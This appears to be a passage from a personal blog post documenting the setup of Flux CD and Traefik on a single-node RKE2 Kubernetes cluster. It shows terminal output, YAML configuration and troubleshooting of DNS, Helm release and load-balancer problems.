<span id="cb4-12">✔ public key: ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCelSERwSNpguy4f2oqrpkPgtq3MT7iKY7fVnofpp72hqdfLH4Z0i34HFy8vXKPL1aKd07HNiMFPujG8E/lE/pb3W5sSNkJPh//YZRz2SlZo7Mh2tkBDLe3Ap8GQgJk/jJHMoCS7YQudT4rAi/vNBuHvMBaFCjXBLqwbaoRBxm5t7hiNFi1I9cSdrIP8v6fubv2VbWV72kiwq/IQeJkURFN9UZJFQ6/Dd6os4ZZg3IEY+EVCpkOyi8d8KnS8fnd8vMk/96jl8mBqRk8ZCsBu6qRbs3HfT6FqCuIgIblxixhrpVmJRJ8cJzMGT5I8deuTPZQ4gPNYYNdxkHW8oztISx0Jql15LtgeJi1iQMwj3ZqIEXPxbgWYZc57jodGvdo7PQTAa3PXOopIJrbmQNi6T2OLwgjidWDgYs7gDJdmAFv52g8zeRh7HyO83yCC7IC1MXodLd9zJinvyBRg5DAdKQnW7zTbcEDsUSGgEI+LQdShRcShmnBzDtJMs2oQujLOaM=</span>
<span id="cb4-13">Please give the key access to your repository: y</span>
<span id="cb4-14">► applying source secret "flux-system/flux-system"</span>
<span id="cb4-15">✔ reconciled source secret</span>
<span id="cb4-16">► generating sync manifests</span>
<span id="cb4-17">✔ generated sync manifests</span>
<span id="cb4-18">✔ committed sync manifests to "main" ("e3f5512df167ca2bc974428cff0dc17787d713f1")</span>
<span id="cb4-19">► pushing sync manifests to "ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/fleet-charts"</span>
<span id="cb4-20">► applying sync manifests</span>
<span id="cb4-21">✔ reconciled sync configuration</span>
<span id="cb4-22">◎ waiting for GitRepository "flux-system/flux-system" to be reconciled</span>
<span id="cb4-23">✔ GitRepository reconciled successfully</span>
<span id="cb4-24">◎ waiting for Kustomization "flux-system/flux-system" to be reconciled</span>
<span id="cb4-25">✔ Kustomization reconciled successfully</span>
<span id="cb4-26">► confirming components are healthy</span>
<span id="cb4-27">✔ helm-controller: deployment ready</span>
<span id="cb4-28">✔ kustomize-controller: deployment ready</span>
<span id="cb4-29">✔ notification-controller: deployment ready</span>
<span id="cb4-30">✔ source-controller: deployment ready</span>
<span id="cb4-31">✔ all components are healthy</span></code></pre></div>
</details>
<p>And just like that, fluxcd is installed.</p>
<div class="callout callout-style-default callout-tip callout-titled">
<div class="callout-header d-flex align-content-center">
<div class="callout-icon-container">
<i class="callout-icon"></i>
</div>
<div class="callout-title-container flex-fill">
Flux suspend/resume resources
</div>
</div>
<div class="callout-body-container callout-body">
<p><code>flux suspend source git flux-system</code> pauses flux’s reconciliation with the git repo. This allows me to test applying resources with <code>kubectl apply -f</code>, before I commit to git.</p>
<p><code>flux resume source git flux-system</code> resumes flux’s reconciliation.</p>
</div>
</div>
</section>
<section id="reverse-proxy-traefik-then-nginx" class="level2">
<h2 class="anchored" data-anchor-id="reverse-proxy-traefik-then-nginx">Reverse Proxy (Traefik, then Nginx)</h2>
<p>The first step of my cluster should be my reverse proxy, as an ingress. This exposes basically all of my services.</p>
<p>The <a href="https://fluxcd.io/flux/use-cases/helm/">flux example of helm page</a> actually has an example where they set up helm.</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb5-1">[moonpie@lizard home-manager]$ kubectl version</span>
<span id="cb5-2">Client Version: v1.30.2</span>
<span id="cb5-3">Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3</span>
<span id="cb5-4">The connection to the server localhost:8080 was refused - did you specify the right host or port?</span>
<span id="cb5-5">[moonpie@lizard home-manager]$ git remote -v^C</span>
<span id="cb5-6">[moonpie@lizard home-manager]$ flux create source helm traefik --url https://helm.traefik.io/traefik --namespace traefik</span>
<span id="cb5-7">✚ generating HelmRepository source</span>
<span id="cb5-8">► applying HelmRepository source</span>
<span id="cb5-9">✗ namespaces "traefik" not found</span>
<span id="cb5-10">[moonpie@lizard home-manager]$ flux create source helm traefik --url https://helm.traefik.io/traefik</span>
<span id="cb5-11">✚ generating HelmRepository source</span>
<span id="cb5-12">► applying HelmRepository source</span>
<span id="cb5-13">✔ source created</span>
<span id="cb5-14">◎ waiting for HelmRepository source reconciliation</span>
<span id="cb5-15">✔ HelmRepository source reconciliation completed</span>
<span id="cb5-16">✔ fetched revision: sha256:48513aa497c9bf46e3053d2aef7e4d184d6df2165389a6024b03f8565fd501e8</span>
<span id="cb5-17">[moonpie@lizard home-manager]$ flux create helmrelease my-traefik --chart traefik --source HelmRepository/traefik</span>
<span id="cb5-18">✚ generating HelmRelease</span>
<span id="cb5-19">► applying HelmRelease</span>
<span id="cb5-20">✔ HelmRelease created</span>
<span id="cb5-21">◎ waiting for HelmRelease reconciliation</span>
<span id="cb5-22">✗ context deadline exceeded</span></code></pre></div>
<p>Is this a failure? I can’t tell?</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb6-1">[moonpie@lizard fleet-charts]$ flux get sources all</span>
<span id="cb6-2">NAME                            REVISION                SUSPENDED       READY   MESSAGE</span>
<span id="cb6-3">gitrepository/flux-system       main@sha1:e3f5512d      False           True    stored artifact for revision 'main@sha1:e3f5512d'</span>
<span id="cb6-4"></span>
<span id="cb6-5">NAME                    REVISION        SUSPENDED       READY   MESSAGE</span>
<span id="cb6-6">helmrepository/traefik  sha256:48513aa4 False           True    stored artifact: revision 'sha256:48513aa4'</span>
<span id="cb6-7"></span>
<span id="cb6-8">NAME                                    REVISION        SUSPENDED       READY   MESSAGE</span>
<span id="cb6-9">helmchart/flux-system-my-traefik        31.0.0          False           True    pulled 'traefik' chart with version '31.0.0'</span>
<span id="cb6-10"></span>
<span id="cb6-11">[moonpie@lizard fleet-charts]$ kubectl get pods --all-namespaces</span>
<span id="cb6-12">NAMESPACE     NAME                                                    READY   STATUS      RESTARTS   AGE</span>
<span id="cb6-13">flux-system   helm-controller-76dff45854-pj876                        1/1     Running     0          3d1h</span>
<span id="cb6-14">flux-system   kustomize-controller-6bc5d5b96-jzj24                    1/1     Running     0          3d1h</span>
<span id="cb6-15">flux-system   my-traefik-5b4fbbd9c8-2rck9                             1/1     Running     0          7m24s</span>
<span id="cb6-16">flux-system   notification-controller-7f5cd7fdb8-7db4q                1/1     Running     0          3d1h</span>
<span id="cb6-17">flux-system   source-controller-54c89dcbf6-p2gd6                      1/1     Running     0          3d1h</span>
<span id="cb6-18">kube-system   cloud-controller-manager-thoth                          1/1     Running     0          3d3h</span>
<span id="cb6-19">kube-system   etcd-thoth                                              1/1     Running     0          3d3h</span>
<span id="cb6-20">kube-system   helm-install-rke2-canal-hmjrm                           0/1     Completed   0          3d3h</span>
<span id="cb6-21">kube-system   helm-install-rke2-coredns-m2jwz                         0/1     Completed   0          3d3h</span>
<span id="cb6-22">kube-system   helm-install-rke2-ingress-nginx-cszxd                   0/1     Completed   0          3d3h</span>
<span id="cb6-23">kube-system   helm-install-rke2-metrics-server-gkqfd                  0/1     Completed   0          3d3h</span>
<span id="cb6-24">kube-system   helm-install-rke2-snapshot-controller-crd-ztz6n         0/1     Completed   0          3d3h</span>
<span id="cb6-25">kube-system   helm-install-rke2-snapshot-controller-f2zfz             0/1     Completed   0          3d3h</span>
<span id="cb6-26">kube-system   helm-install-rke2-snapshot-validation-webhook-52kj2     0/1     Completed   0          3d3h</span>
<span id="cb6-27">kube-system   kube-apiserver-thoth                                    1/1     Running     0          3d3h</span>
<span id="cb6-28">kube-system   kube-controller-manager-thoth                           1/1     Running     0          3d3h</span>
<span id="cb6-29">kube-system   kube-proxy-thoth                                        1/1     Running     0          3d3h</span>
<span id="cb6-30">kube-system   kube-scheduler-thoth                                    1/1     Running     0          3d3h</span>
<span id="cb6-31">kube-system   rke2-canal-gb7bx                                        2/2     Running     0          3d3h</span>
<span id="cb6-32">kube-system   rke2-coredns-rke2-coredns-6bb85f9dd8-zzqlv              1/1     Running     0          3d3h</span>
<span id="cb6-33">kube-system   rke2-coredns-rke2-coredns-autoscaler-7b9c797d64-4bwcb   1/1     Running     0          3d3h</span>
<span id="cb6-34">kube-system   rke2-ingress-nginx-controller-ct4mj                     1/1     Running     0          3d3h</span>
<span id="cb6-35">kube-system   rke2-metrics-server-868fc8795f-5t6v6                    1/1     Running     0          3d3h</span>
<span id="cb6-36">kube-system   rke2-snapshot-controller-7dcf5d5b46-5dtvt               1/1     Running     0          3d3h</span>
<span id="cb6-37">kube-system   rke2-snapshot-validation-webhook-bf7bbd6fc-gqqgr        1/1     Running     0          3d3h</span>
<span id="cb6-38">[moonpie@lizard fleet-charts]$ git pull</span>
<span id="cb6-39">Already up to date.</span>
<span id="cb6-40">[moonpie@lizard fleet-charts]$</span></code></pre></div>
<p>Another weird thing is that no changes were made to the git repo where I was tracking flux… but changes were made to my cluster. I thought the point of flux was that all state was in the git repo, but that doesn’t seem to be the case here.</p>
<p>Oh. Oops. RKE2 comes with an nginx controller already. I may have to remove that if I want traefik as an ingress controller.</p>
<p><a href="https://docs.rke2.io/helm?_highlight=uninstall#disabling-addons">Thankfully, it doesn’t appear to be too hard</a>.</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/etc/rancher/rke2/config.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb7" data-filename="/etc/rancher/rke2/config.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb7-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">disable</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb7-2"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> rke2-coredns</span></span>
<span id="cb7-3"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> rke2-ingress-nginx</span></span></code></pre></div>
</div>
<p>And now, those services are disabled.</p>
<p>Oh, and I was wrong, there are files in the git repo now.</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb8-1">[moonpie@lizard fleet-charts]$ ls *</span>
<span id="cb8-2">begin.md</span>
<span id="cb8-3"></span>
<span id="cb8-4">flux-system:</span>
<span id="cb8-5">gotk-components.yaml  gotk-sync.yaml  kustomization.yaml</span></code></pre></div>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb9-1">[moonpie@lizard flux-system]$ wc -l *</span>
<span id="cb9-2"> 12385 gotk-components.yaml</span>
<span id="cb9-3">    27 gotk-sync.yaml</span>
<span id="cb9-4">     5 kustomization.yaml</span>
<span id="cb9-5"> 12417 total</span></code></pre></div>
<p>Uuuh… That’s a lot of lines. I think that <code>gotk-components.yaml</code> file has basically all of the fluxcd components stored and tracked in there.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb10-1">[moonpie@lizard flux-system]$ cat * | grep traefik</span>
<span id="cb10-2">[moonpie@lizard flux-system]$</span></code></pre></div>
<p>And… no mentions of traefik? It’s obviously stored in the cluster, given something related shows up when I observe the kubernetes pods, but nothing appears in the git repo.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb11-1">[moonpie@lizard flux-system]$ flux get sources all -A</span>
<span id="cb11-2">NAMESPACE       NAME                            REVISION                SUSPENDED       READY   MESSAGE                                                                                       </span>
<span id="cb11-3">flux-system     gitrepository/flux-system       main@sha1:e3f5512d      False           False   failed to checkout and determine revision: unable to list remote for 'ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/fleet-charts': dial tcp: lookup moonpiedumpl.ing on 10.43.0.10:53: read udp 10.42.0.22:38747-&gt;10.43.0.10:53: i/o timeout</span></code></pre></div>
<p>Okay, it appears that flux is having trouble accessing my git repo. I found a <a href="https://github.com/fluxcd/flux2/issues/4673">relevant github issue</a>, and it looks like a DNS problem. It looks, since I disabled the Kubernetes CoreDNS service, DNS wasn’t working inside my cluster, preventing it from accessing my domain name.</p>
<p>So:</p>
<div class="code-with-filename">
<div class="code-with-filename-file">
<pre><strong>/etc/rancher/rke2/config.yaml</strong></pre>
</div>
<div class="sourceCode" id="cb12" data-filename="/etc/rancher/rke2/config.yaml" style="background: #f1f3f5;"><pre class="sourceCode yaml code-with-copy"><code class="sourceCode yaml"><span id="cb12-1"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">disable</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">:</span></span>
<span id="cb12-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">  # Yeah so apparently this was kind of important. </span></span>
<span id="cb12-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">  # - rke2-coredns</span></span>
<span id="cb12-4"><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">  </span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">-</span><span class="at" style="color: #657422;
background-color: null;
font-style: inherit;"> rke2-ingress-nginx</span></span></code></pre></div>
</div>
<p>And with this, flux bootstrap works properly:</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb13-1">[moonpie@lizard vscode]$ flux bootstrap git --url ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/flux-config --branch=main --private-key-file=/home/moonpie/.ssh/moonstack --verbose --insecure-skip-tls-verify</span>
<span id="cb13-2">► cloning branch "main" from Git repository "ssh://moonpie@moonpiedumpl.ing:22022/home/moonpie/flux-config"</span>
<span id="cb13-3">✔ cloned repository</span>
<span id="cb13-4">...</span>
<span id="cb13-5">...</span>
<span id="cb13-6">✔ reconciled sync configuration</span>
<span id="cb13-7">◎ waiting for GitRepository "flux-system/flux-system" to be reconciled</span>
<span id="cb13-8">✔ GitRepository reconciled successfully</span>
<span id="cb13-9">◎ waiting for Kustomization "flux-system/flux-system" to be reconciled</span>
<span id="cb13-10">✔ Kustomization reconciled successfully</span>
<span id="cb13-11">► confirming components are healthy</span>
<span id="cb13-12">✔ helm-controller: deployment ready</span>
<span id="cb13-13">✔ kustomize-controller: deployment ready</span>
<span id="cb13-14">✔ notification-controller: deployment ready</span>
<span id="cb13-15">✔ source-controller: deployment ready</span>
<span id="cb13-16">✔ all components are healthy</span></code></pre></div>
<p>I also changed the name of the git repo to <code>flux-config</code>.</p>
<p>I also realized that the <code>flux-system</code> repo is the configs of the flux-system namespace. Meaning, each directory <em>should</em> be a namespace? However, I don’t think I’m going to use many namespaces, they seem like extra complexity designed for multi-project or multi-user kubernetes clusters.</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb14-1">[moonpie@lizard vscode]$ flux create source helm traefik --url https://helm.traefik.io/traefik</span>
<span id="cb14-2">✚ generating HelmRepository source</span>
<span id="cb14-3">► applying HelmRepository source</span>
<span id="cb14-4">✔ source created</span>
<span id="cb14-5">◎ waiting for HelmRepository source reconciliation</span>
<span id="cb14-6">✔ HelmRepository source reconciliation completed</span>
<span id="cb14-7">✔ fetched revision: sha256:48513aa497c9bf46e3053d2aef7e4d184d6df2165389a6024b03f8565fd501e8</span>
<span id="cb14-8"></span>
<span id="cb14-9"></span>
<span id="cb14-10">Events:                       &lt;none&gt;</span>
<span id="cb14-11">[moonpie@lizard flux-config]$ flux create helmrelease traefik --chart traefik --source HelmRepository/traefik --chart-version 31.0.0 --verbose</span>
<span id="cb14-12">✚ generating HelmRelease</span>
<span id="cb14-13">► applying HelmRelease</span>
<span id="cb14-14">✔ HelmRelease updated</span>
<span id="cb14-15">◎ waiting for HelmRelease reconciliation</span>
<span id="cb14-16">^C</span></code></pre></div>
<p>Despite my impatience, it did render, and Traefik did deploy.</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb15-1">[moonpie@lizard flux-system]$ kubectl get pods -n flux-system</span>
<span id="cb15-2">NAME                                       READY   STATUS    RESTARTS   AGE</span>
<span id="cb15-3">helm-controller-76dff45854-g8tff           1/1     Running   0          3h4m</span>
<span id="cb15-4">kustomize-controller-6bc5d5b96-sdzql       1/1     Running   0          3h4m</span>
<span id="cb15-5">notification-controller-7f5cd7fdb8-v9672   1/1     Running   0          3h4m</span>
<span id="cb15-6">source-controller-54c89dcbf6-kjjsb         1/1     Running   0          3h4m</span>
<span id="cb15-7">traefik-6f6c897d6-j7g8z                    1/1     Running   0          9m34s</span></code></pre></div>
<p>But… no changes were made to the git repo? I’m confused, as I thought the point of flux was that all changes would be version controlled.</p>
<p>I started to follow the <a href="">flux troubleshooting guide</a>.</p>
<div class="sourceCode" id="cb16" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb16-1">[moonpie@lizard moonpiedumplings.github.io]$ kubectl describe helmrelease traefik -n flux-system</span>
<span id="cb16-2">Name:         traefik</span>
<span id="cb16-3">Namespace:    flux-system</span>
<span id="cb16-4">...</span>
<span id="cb16-5">...</span>
<span id="cb16-6">Status:</span>
<span id="cb16-7">  Conditions:</span>
<span id="cb16-8">    Last Transition Time:  2024-09-17T20:16:28Z</span>
<span id="cb16-9">    Message:               Failed to install after 1 attempt(s)</span>
<span id="cb16-10">    Observed Generation:   1</span>
<span id="cb16-11">    Reason:                RetriesExceeded</span>
<span id="cb16-12">    Status:                True</span>
<span id="cb16-13">    Type:                  Stalled</span>
<span id="cb16-14">    Last Transition Time:  2024-09-17T20:16:28Z</span>
<span id="cb16-15">    Message:               Helm install failed for release flux-system/traefik with chart traefik@31.0.0: client rate limiter Wait returned an error: context deadline</span>
<span id="cb16-16">...</span>
<span id="cb16-17">...</span>
<span id="cb16-18">2024-09-17T20:11:27.315654788Z: CustomResourceDefinition serverstransporttcps.traefik.io is already present. Skipping.</span>
<span id="cb16-19">2024-09-17T20:11:27.315658603Z: creating 1 resource(s)</span>
<span id="cb16-20">2024-09-17T20:11:27.324448937Z: CustomResourceDefinition tlsoptions.traefik.io is already present. Skipping.</span>
<span id="cb16-21">2024-09-17T20:11:27.324452859Z: creating 1 resource(s)</span>
<span id="cb16-22">2024-09-17T20:11:27.332385521Z: CustomResourceDefinition tlsstores.traefik.io is already present. Skipping.</span>
<span id="cb16-23">2024-09-17T20:11:27.332389484Z: creating 1 resource(s)</span>
<span id="cb16-24">2024-09-17T20:11:27.348449663Z: CustomResourceDefinition traefikservices.traefik.io is already present. Skipping.</span>
<span id="cb16-25">2024-09-17T20:11:27.85810682Z: creating 6 resource(s)</span>
<span id="cb16-26">2024-09-17T20:11:27.904853344Z: beginning wait for 6 resources with timeout of 5m0s</span>
<span id="cb16-27">2024-09-17T20:11:27.909519301Z: Service does not have load balancer ingress IP address: flux-system/traefik</span>
<span id="cb16-28">2024-09-17T20:16:25.90942954Z:  : flux-system/traefik (148 duplicate lines omitted)</span></code></pre></div>
<p>So it seems I’m missing a “load balancer ingress IP address”.</p>
<p>I also find it odd that the relevant configs are not automatically added to the git repo. I decided to experiment with adding files to the git repo, rather than using the flux cli.</p>
<div class="sourceCode" id="cb17" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb17-1">[moonpie@lizard flux-config]$ ls traefik/</span>
<span id="cb17-2">config.yaml  source.yaml</span></code></pre></div>
<div class="sourceCode" id="cb18" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb18-1">[moonpie@lizard traefik]$ cat config.yaml</span>
<span id="cb18-2">---</span>
<span id="cb18-3">apiVersion: helm.toolkit.fluxcd.io/v2</span>
<span id="cb18-4">kind: HelmRelease</span>
<span id="cb18-5">metadata:</span>
<span id="cb18-6">  name: traefik</span>
<span id="cb18-7">  namespace: flux-system</span>
<span id="cb18-8">spec:</span>
<span id="cb18-9">  chart:</span>
<span id="cb18-10">    spec:</span>
<span id="cb18-11">      chart: traefik</span>
<span id="cb18-12">      reconcileStrategy: ChartVersion</span>
<span id="cb18-13">      sourceRef:</span>
<span id="cb18-14">        kind: HelmRepository</span>
<span id="cb18-15">        name: traefik</span>
<span id="cb18-16">      version: 31.0.0</span>
<span id="cb18-17">  interval: 1m0s</span>
<span id="cb18-18">  values:</span>
<span id="cb18-19">    service:</span>
<span id="cb18-20">        type: LoadBalancer</span>
<span id="cb18-21">[moonpie@lizard traefik]$ cat source.yaml</span>
<span id="cb18-22">---</span>
<span id="cb18-23">apiVersion: source.toolkit.fluxcd.io/v1</span>
<span id="cb18-24">kind: HelmRepository</span>
<span id="cb18-25">metadata:</span>
<span id="cb18-26">  name: traefik</span>
<span id="cb18-27">  namespace: flux-system</span>
<span id="cb18-28">spec:</span>
<span id="cb18-29">  interval: 1m0s</span>
<span id="cb18-30">  url: https://traefik.github.io/charts/</span></code></pre></div>
<p>This actually deploys properly without errors, so it seems that the flux git repo organization is arbitrary and for the purposes of maknig it readable for humans, and is not actually necessary.</p>
<p>It probably doesn’t error because I have the <code>service: type: LoadBalancer</code>, but it doesn’t actually use any ports or seem to be deployed in a useful manner.</p>
<p>Also:</p>
<div class="sourceCode" id="cb19" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb19-1">[moonpie@lizard traefik]$ kubectl get -n flux-system service</span>
<span id="cb19-2">NAMESPACE     NAME                               TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)                      AGE</span>
<span id="cb19-3">default       kubernetes                         ClusterIP      10.43.0.1       &lt;none&gt;        443/TCP                      6d20h</span>
<span id="cb19-4">flux-system   notification-controller            ClusterIP      10.43.164.182   &lt;none&gt;        80/TCP                       2d14h</span>
<span id="cb19-5">flux-system   source-controller                  ClusterIP      10.43.58.240    &lt;none&gt;        80/TCP                       2d14h</span>
<span id="cb19-6">flux-system   traefik                            LoadBalancer   10.43.109.84    &lt;pending&gt;     80:30239/TCP,443:31645/TCP   18h</span>
<span id="cb19-7">flux-system   webhook-receiver                   ClusterIP      10.43.226.89    &lt;none&gt;        80/TCP                       2d14h</span></code></pre></div>
<p>It seems that traefik comes with a load balancer type service, but it doesn’t actually get an external ip. Why?</p>
<p>After more research, it seems that a load balancer is actually needed in order to use a load balancer type service. On cloud instances, the cloud server acts as a load balancer and can do this. On bare metal instances, users are on their own. The most common deployment for a bare metal load balancer seems to be <a href="https://metallb.io/">metallb</a>, but that doesn’t really work for me, as I only have ONE ip address and it looks like metallb expects you to be able to ask for more on the spot somehow.</p>
<p>(well… technically, I can use dhcp to ask for more ip addresses, but it doesn’t look like metallb supports that use case, only something different)</p>
<p>Instead, I found <a href="https://docs.k3s.io/networking/networking-services?_highlight=ingress#service-load-balancer">klipper</a>. Klipper is an <em>extremely</em> simple load balancing service built into K3s — but disabled in RKE2 by default. All it does is use iptables/nftables to forward traffic from ports you want the load balancer to forward from, to inside the cluster.</p>
<p><a href="https://docs.rke2.io/networking/networking_services?_highlight=load#service-load-balancer">RKE2 can deply klipper by using an install flag</a>… and it seems, <strong>only</strong> via an install flag. There doesn’t seem to be another way to install klipper, no helm charts or anything… it seems to just be a bash script in a docker container.</p>
<p>So, it looks like I need to uninstall my cluster and redeploy it…</p>
<div class="sourceCode" id="cb20" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb20-1">curl -sfL https://get.rke2.io --output install.sh</span>
<span id="cb20-2">chmod +x install.sh</span>
<span id="cb20-3"></span>
<span id="cb20-4">./install.sh --serviceLB # with root privileges</span></code></pre></div>
<p>But, after I reinstalled flux:</p>
<div class="sourceCode" id="cb21" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb21-1">[moonpie@lizard traefik]$ flux get all -n flux-system</span>
<span id="cb21-2">NAME                            REVISION                SUSPENDED       READY   MESSAGE</span>
<span id="cb21-3">gitrepository/flux-system       main@sha1:819432fd      False           True    stored artifact for revision 'main@sha1:819432fd'</span>
<span id="cb21-4"></span>
<span id="cb21-5">NAME                    REVISION        SUSPENDED       READY   MESSAGE</span>
<span id="cb21-6">helmrepository/traefik  sha256:1c0fc56c False           True    stored artifact: revision 'sha256:1c0fc56c'</span>
<span id="cb21-7"></span>
<span id="cb21-8">NAME                            REVISION        SUSPENDED       READY   MESSAGE</span>
<span id="cb21-9">helmchart/flux-system-traefik   31.0.0          False           True    pulled 'traefik' chart with version '31.0.0'</span>
<span id="cb21-10"></span>
<span id="cb21-11">NAME                    REVISION        SUSPENDED       READY   MESSAGE</span>
<span id="cb21-12"></span>
<span id="cb21-13">helmrelease/traefik     31.0.0          False           False   Helm install failed for release flux-system/traefik with chart traefik@31.0.0: Unable to continue with install: Service "traefik" in namespace "flux-system" exists and cannot be imported into the current release: invalid ownership metadata; label validation error: missing key "app.kubernetes.io/managed-by": must be set to "Helm"; annotation validation error: missing key "meta.helm.sh/release-name": must be set to "traefik"; annotation validation error: missing key "meta.helm.sh/release-namespace": must be set to "flux-system"</span>
<span id="cb21-14"></span>
<span id="cb21-15">NAME                            REVISION                SUSPENDED       READY   MESSAGE</span>
<span id="cb21-16">kustomization/flux-system       main@sha1:819432fd      False           True    Applied revision: main@sha1:819432fd</span></code></pre></div>
<div class="sourceCode" id="cb22" style="background: #f1f3f5;"><pre class="sourceCode default code-with-copy"><code class="sourceCode default"><span id="cb22-1">root@thoth:/usr/local/bin# ls</span>
<span id="cb22-2">rke2  rke2-killall.sh  rke2-uninstall.sh</span>
<span id="cb22-3">root@thoth:/usr/local/bin# rke2</span>
<span id="cb22-4">rke2               rke2-killall.sh    rke2-uninstall.sh</span>
<span id="cb22-5">root@thoth:/usr/local/bin# rke2</span>
<span id="cb22-6">rke2               rke2-killall.sh    rke2-uninstall.sh</span>
<span id="cb22-7">root@thoth:/usr/local/bin# rke2 server --help</span>
<span id="cb22-8">NAME:</span>
<span id="cb22-9">   rke2 server - Run management server</span>
<span id="cb22-10"></span>
<span id="cb22-11">USAGE:</span>
<span id="cb22-12">   rke2 server [OPTIONS]</span>
<span id="cb22-13"></span>
<span id="cb22-14">OPTIONS:</span>
<span id="cb22-15">   --config FILE, -c FILE                        (config) Load configuration from FILE (default: "/etc/rancher/rke2/config.yaml") [$RKE2_CONFIG_FILE]</span>
<span id="cb22-16">   --debug                                       (logging) Turn on debug logs [$RKE2_DEBUG]</span>
<span id="cb22-17">   --bind-address value                          (listener) rke2 bind address (default: 0.0.0.0)</span>
<span id="cb22-18">   --advertise-address value                     (listener) IPv4/IPv6 address that apiserver uses to advertise to members of the cluster (default: node-external-ip/node-ip)</span>
<span id="cb22-19">   --tls-san value                               (listener) Add additional hostnames or IPv4/IPv6 addresses as Subject Alternative Names on the server TLS cert</span>
<span id="cb22-20">   --tls-san-security                            (listener) Protect the server TLS cert by refusing to add Subject Alternative Names not associated with the kubernetes apiserver service, s</span>
<span id="cb22-21">   --data-dir value, -d value                    (data) Folder to hold state (default: "/var/lib/rancher/rke2") [$RKE2_DATA_DIR]</span>
<span id="cb22-22">   --cluster-cidr value                          (networking) IPv4/IPv6 network CIDRs to use for pod IPs (default: 10.42.0.0/16)</span>
<span id="cb22-23">   --service-cidr value                          (networking) IPv4/IPv6 network CIDRs to use for service IPs (default: 10.43.0.0/16)</span>
<span id="cb22-24">   --service-node-port-range value               (networking) Port range to reserve for services with NodePort visibility (default: "30000-32767")</span>
<span id="cb22-25">   --cluster-dns value                           (networking) IPv4 Cluster IP for coredns service. Should be in your service-cidr range (default: 10.43.0.10)</span>
<span id="cb22-26">   --cluster-domain value                        (networking) Cluster Domain (default: "cluster.local")</span>
<span id="cb22-27">   --egress-selector-mode value                  (networking) One of 'agent', 'cluster', 'pod', 'disabled' (default: "agent")</span>
<span id="cb22-28">   --servicelb-namespace value                   (networking) Namespace of the pods for the servicelb component (default: "kube-system")</span>
<span id="cb22-29">   --write-kubeconfig value, -o value            (client) Write kubeconfig for admin client to this file [$RKE2_KUBECONFIG_OUTPUT]</span>
<span id="cb22-30">   --write-kubeconfig-mode value                 (client) Write kubeconfig with this mode [$RKE2_KUBECONFIG_MODE]</span>
<span id="cb22-31">   --write-kubeconfig-group value                (client) Write kubeconfig with this group [$RKE2_KUBECONFIG_GROUP]</span>
<span id="cb22-32">   --helm-job-image value                        (helm) Default image to use for helm jobs</span>
<span id="cb22-33">   --token value, -t value                       (cluster) Shared secret used to join a server or agent to a cluster [$RKE2_TOKEN]</span>
<span id="cb22-34">   --token-file value                            (cluster) File containing the token [$RKE2_TOKEN_FILE]</span>
<span id="cb22-35">   --agent-token value                           (cluster) Shared secret used to join agents to the cluster, but not servers [$RKE2_AGENT_TOKEN]</span>
<span id="cb22-36">   --agent-token-file value                      (cluster) File containing the agent secret [$RKE2_AGENT_TOKEN_FILE]</span>
<span id="cb22-37">   --server value, -s value                      (cluster) Server to connect to, used to join a cluster [$RKE2_URL]</span>
<span id="cb22-38">   --cluster-reset                               (cluster) Forget all peers and become sole member of a new cluster [$RKE2_CLUSTER_RESET]</span>
<span id="cb22-39">   --cluster-reset-restore-path value            (db) Path to snapshot file to be restored</span>
